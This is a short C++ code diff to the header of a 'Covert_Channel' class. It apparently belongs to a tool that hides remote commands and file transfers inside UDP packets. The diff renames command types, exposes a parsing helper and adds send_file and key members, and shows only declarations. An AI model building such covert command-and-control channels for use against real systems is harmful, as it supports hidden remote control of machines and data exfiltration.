@@ -13,7 +13,7 @@ using namespace Tins;
 class Covert_Channel
 {
 public:
-    enum CMD { run_cmd, ret_cmd, get_file, ret_file };
+    enum CMD { run_command, return_command, get_file, return_file };
 
     typedef std::vector<unsigned char> uchar_vector;
     typedef boost::bimap<CMD, string> command_map;
@@ -55,17 +55,20 @@ public:
     virtual bool parse_command(Job& j) = 0;
     bool udp_send(string dest_ip, int dst_port, uchar_vector hidden);
     bool udp_recv(uchar_vector payload, Address a);
+    bool split_command_argument_with_regex(const string& command_argument, Job& j);
+    bool send_file(string dest_ip, int dest_port, string filename);
 
     command_map cmdMap;
     Config config;
 private:
     bool finish_transfer(string payload_jid_tag);
-    bool split_command_argument_with_regex(const string& command_argument, Job& j);
+
 
     PacketSender sender;
     jobs_map jobs;
     string server_id;
     string eof_flag;
+    string key;
 
 };
 
